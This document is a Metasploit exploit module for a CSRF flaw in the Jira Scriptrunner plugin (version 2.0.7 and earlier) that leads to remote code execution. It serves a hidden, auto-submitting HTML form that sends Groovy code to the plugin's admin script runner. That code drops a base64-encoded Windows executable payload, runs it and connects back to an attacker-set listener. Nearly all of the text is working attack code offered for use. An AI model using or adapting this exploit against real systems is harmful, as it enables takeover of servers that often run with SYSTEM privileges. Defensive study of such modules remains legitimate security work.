#[Title] Jira Scriptrunner 2.0.7 <= CSRF/RCE
#[Twitter] @highjack_
#[Author Url] http://bensheppard.net/jira-scriptrunner-2-0-7/
#[Vendor Url] https://marketplace.atlassian.com/plugins/com.onresolve.jira.groovy.groovyrunner
#[Install] To use this copy it into  ~/.msf4/modules/exploits/windows/http/scriptrunner.rb
 
 
require &#039;msf/core&#039;
 
class Metasploit4 < Msf::Exploit::Remote
    include Msf::Exploit::Remote::HttpServer::HTML
    include Msf::Exploit::EXE
 
    def initialize
    super(
        &#039;Name&#039; => &#039;Jira Scriptrunner 2.0.7 <= CSRF/RCE&#039;,
        &#039;Description&#039; => %q{This jira plugin does notuse the built in jira protections (websudo or csrf tokens)
                 to protect the page from CSRF. This page is supposed to be used by admins to automate tasks,
                it will accept java code and by default in a windows environment jira will
                be run as system},
        &#039;Author&#039; => [ &#039;Ben \&#039;highjack\&#039; Sheppard&#039;],
        &#039;License&#039; => MSF_LICENSE,
        &#039;Version&#039; => &#039;Revision: 1 &#039;,
        &#039;Platform&#039; => [ &#039;win&#039;],
        &#039;Targets&#039; =>
            [
                [&#039;Windows&#039;,   { &#039;Arch&#039; => ARCH_X86, &#039;Platform&#039; => &#039;win&#039;   }]
            ],
        &#039;DefaultTarget&#039; => 0
        )
         
    register_options(
                        [
                OptString.new(&#039;RHOST&#039;, [true, &#039;Remote host of jira box&#039;]),
                                OptPort.new(&#039;RPORT&#039;, [true, &#039;Remote port of jira box&#039;, 8080]),
                OptString.new(&#039;LHOST&#039;, [true, &#039;Multihandler host to listen on&#039;]),
                OptBool.new(&#039;IS_SSL&#039;, [true, &#039;Does the target use ssl?&#039;, false]),
                OptPort.new(&#039;LPORT&#039;, [true, &#039;Multihandler port to listen on&#039;,4444])
                        ], self.class)
 
    end
 
    def csrf(url)
        shell = Rex::Text.rand_text_alpha(rand(8)+3) + ".exe"
        opts                = {:arch => target.arch, :platform => target.platform}
        encodedPayload      = Rex::Text.encode_base64(generate_payload_exe(opts))
         
        payloadLength = encodedPayload.length
                chunkLength = 500
     
                stringBuffer = ""
                for i in (0..payloadLength / chunkLength)
                        if payloadLength < i+chunkLength
                                 position = payloadLength-i
                        else
                                position = chunkLength
                        end
                        stringBuffer = stringBuffer + "encodedPayload.append(\"" + encodedPayload[i*chunkLength,position] + "\");\n"
                end
 
        jiraPayload = %Q|
                import sun.misc.BASE64Decoder;
                import java.io.*;
                            Runtime rt = Runtime.getRuntime();
                try
                {
                 
                StringBuffer encodedPayload = new StringBuffer();
                #{stringBuffer}
                String sEncodedPayload = new String(encodedPayload.toString());
                BASE64Decoder b64decoder = new BASE64Decoder();
                byte[] decodedPayload = b64decoder.decodeBuffer(sEncodedPayload);
                 
                BufferedOutputStream output = new BufferedOutputStream(new FileOutputStream("#{shell}"));
                output.write(decodedPayload);
                output.close();
                }
                catch (Exception e)
                {
                return(e);
                }
                try
                {
        |
        jiraPayload = jiraPayload + "rt.exec(\"#{shell}\");}catch (Exception e){return (e);}"
        html = %Q|
        <html>
        <head></head>
        <body>
        <form action=&#039;#{url}/secure/admin/groovy/GroovyRunner.jspa&#039; method=&#039;POST&#039; id=&#039;groovy&#039;>
        <input type=&#039;hidden&#039; name=&#039;scriptLanguage&#039; value=&#039;Groovy&#039; />
        <div style=&#039;display:none&#039;>
        <textarea name=&#039;script&#039;>#{jiraPayload}</textarea>
        </div>
        <input type=&#039;hidden&#039; name=&#039;Run&32;now&#039; value=&#039;Run&32;now&#039; />
        </form>
        <script>document.getElementById(&#039;groovy&#039;).submit();</script>
        </body>
        </html>
        |
        return html
    end
     
    def getUrl()
        rhost = datastore[&#039;RHOST&#039;]
        rport = datastore[&#039;RPORT&#039;]
        isSsl = datastore[&#039;IS_SSL&#039;]
 
        if isSsl == true
            url = &#039;https://&#039;
        else
            url = &#039;http://&#039;
        end
        url = url + rhost + &#039;:&#039; + rport
        return url
    end
    def on_request_uri(cli, request)
        url = getUrl()
        print_status("\n#{self.name} handling response\n")
        send_response_html( cli, csrf(url), { &#039;Content-Type&#039; => &#039;text/html&#039; } )
        return
    end    
     
end

